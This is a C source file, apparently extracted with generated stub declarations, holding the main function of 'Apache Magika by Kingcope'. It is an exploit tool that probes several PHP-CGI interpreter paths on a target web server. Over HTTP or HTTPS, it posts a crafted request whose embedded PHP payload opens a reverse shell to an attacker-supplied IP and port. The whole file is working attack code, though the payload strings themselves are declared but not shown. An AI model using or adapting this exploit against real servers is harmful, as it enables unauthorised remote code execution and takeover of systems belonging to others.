#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct sockaddr_in {int dummy; } ;
struct option {char* member_0; int /*<<< orphan*/  member_3; int /*<<< orphan*/  member_2; int /*<<< orphan*/  const member_1; } ;
struct TYPE_3__ {int /*<<< orphan*/ * handle; int /*<<< orphan*/ * ctx; } ;
typedef  TYPE_1__ connection ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/ * SSL_CTX_new (int /*<<< orphan*/ ) ; 
 int SSL_connect (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  SSL_library_init () ; 
 int /*<<< orphan*/ * SSL_new (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  SSL_set_fd (int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  SSL_write (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  SSLv23_client_method () ; 
 unsigned short atoi (char*) ; 
 char* calloc (unsigned int,int) ; 
 scalar_t__ connect (int,void*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 struct sockaddr_in* gethostbyname_ (char*,unsigned short) ; 
 int getopt_long (int,char**,char*,struct option*,int*) ; 
 scalar_t__ malloc (int) ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 char* optarg ; 
 int optind ; 
 char* phpstr ; 
 char* poststr ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 char* read_ (int) ; 
#define  required_argument 128 
 int /*<<< orphan*/  snprintf (char*,unsigned int,char*,char*,...) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 char* sslread (TYPE_1__*) ; 
 int /*<<< orphan*/  strcmp (char*,char*) ; 
 char* strdup (char*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  usage (char**) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

void main(int argc, char *argv[])
{
  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=NULL,
   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=NULL;
  char httpsflag=0;
  unsigned short port=0, reverseport=0;
  struct sockaddr_in *server;
  int sockfd;
  unsigned int writesize, tmpsize;
  unsigned int i;
  connection *sslconnection;
  printf("-== Apache Magika by Kingcope ==-\n");
  for(;;)
  {
	 int c;
     int option_index=0;
     static struct option long_options[] = {
	   {"target", required_argument, 0, 0 },
	   {"port", required_argument, 0, 0 },
	   {"protocol", required_argument, 0, 0 },
	   {"reverse-ip", required_argument, 0, 0 },
	   {"reverse-port", required_argument, 0, 0 },
	   {"force-interpreter", required_argument, 0, 0 },	   
	   {0, 0, 0, 0 }
	  };
	 
	 c = getopt_long(argc, argv, "", long_options, &option_index);
     if (c < 0)
     	break;
     
     switch (c) {
	 case 0:
	  switch (option_index) {
	   case 0:
	    if (optarg) {
	     target = calloc(strlen(optarg)+1, sizeof(char));
	     if (!target) {
		  printf("calloc error (2)\n");
	      exit(255);
         }
	     memcpy(target, optarg, strlen(optarg)+1);
    	}
        break;
       case 1:
        if(optarg)
	     port = atoi(optarg);
        break;
       case 2:
        protocol = calloc(strlen(optarg)+1, sizeof(char));
        if (!protocol) {
	     printf("calloc error (3)\n");
         exit(255);
        }
        memcpy(protocol, optarg, strlen(optarg)+1);
        if (!strcmp(protocol, "https"))
         httpsflag=1;
        break;
       case 3:
        reverseip = calloc(strlen(optarg)+1, sizeof(char));
        if (!reverseip) {
	     printf("calloc error (4)\n");
         exit(255);
        }
        memcpy(reverseip, optarg, strlen(optarg)+1);       
        break;
       case 4:
	    reverseport = atoi(optarg);       
		reverseportstr = calloc(strlen(optarg)+1, sizeof(char));
        if (!reverseportstr) {
	     printf("calloc error (5)\n");
         exit(255);
        }
        memcpy(reverseportstr, optarg, strlen(optarg)+1);  	     
        break;
       case 5:
        forceinterpreter = calloc(strlen(optarg)+1, sizeof(char));
        if (!forceinterpreter) {
	     printf("calloc error (6)\n");
         exit(255);
        }
        memcpy(forceinterpreter, optarg, strlen(optarg)+1);       
        break;
       default:
        usage(argv);
	  }
	  break;
	 
	 default:
	  usage(argv);
     }
  }

  if ((optind < argc) || !target || !protocol || !port ||
      !reverseip || !reverseport){
	usage(argv);
  }
  
  server = gethostbyname_(target, port);
  if (!server) {
   printf("Error while resolving hostname. (7)\n");
   exit(255);
  }

  char *interpreters[5];
  int ninterpreters = 5;
  interpreters[0] = strdup("/cgi-bin/php");
  interpreters[1] = strdup("/cgi-bin/php5");
  interpreters[2] = strdup("/cgi-bin/php-cgi");
  interpreters[3] = strdup("/cgi-bin/php.cgi");
  interpreters[4] = strdup("/cgi-bin/php4");
  
  for (i=0;i<ninterpreters;i++) {
   interpreter = interpreters[i];
   if (forceinterpreter) {
     interpreter = strdup(forceinterpreter);
   }
   if (forceinterpreter && i)
    break;
   printf("%s\n", interpreter);
   
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if (sockfd < 1) { 
	 printf("socket error (8)\n");
	 exit(255);
   }
  
   if (connect(sockfd, (void*)server, sizeof(struct sockaddr_in)) < 0) {
    printf("connect error (9)\n");
    exit(255);	  
   }
   if (httpsflag) {
    sslconnection = (connection*) malloc(sizeof(connection));
    if (!sslconnection) {
     printf("malloc error (10)\n");
     exit(255);   
    }
    sslconnection->handle = NULL;
    sslconnection->ctx = NULL;

    SSL_library_init();

    sslconnection->ctx = SSL_CTX_new(SSLv23_client_method());
    if (!sslconnection->ctx) {
 	 printf("SSL_CTX_new error (11)\n");
     exit(255);
    }

    sslconnection->handle = SSL_new(sslconnection->ctx);
    if (!sslconnection->handle) {
 	 printf("SSL_new error (12)\n");
	 exit(255);   
    }
    if (!SSL_set_fd(sslconnection->handle, sockfd)) {
 	 printf("SSL_set_fd error (13)\n");
     exit(255);
    }
   
    if (SSL_connect(sslconnection->handle) != 1) {
	 printf("SSL_connect error (14)\n");
     exit(255);       
    }
   }
  
   tmpsize = strlen(phpstr) + strlen(reverseip) + strlen(reverseportstr) + 64;
   tmpstr = (char*)calloc(tmpsize, sizeof(char));
   snprintf(tmpstr, tmpsize, phpstr, reverseip, reverseport);
   
   writesize = strlen(target) + strlen(interpreter) + 
     strlen(poststr) + strlen(tmpstr) + 64;
   writestr = (char*)calloc(writesize, sizeof(char));
   snprintf(writestr, writesize, poststr, interpreter,
     target, strlen(tmpstr), tmpstr);
  
   if (!httpsflag) {
	 write(sockfd, writestr, strlen(writestr));
	 readbuf = read_(sockfd);
   } else {
	 SSL_write(sslconnection->handle, writestr, strlen(writestr));
	 readbuf = sslread(sslconnection);
   }
  
   if (readbuf) {
     printf("***SERVER RESPONSE***\n\n%s\n\n", readbuf);  
   } else {
    printf("read error (15)\n");
    exit(255);	  
   }
  }
  exit(1);
}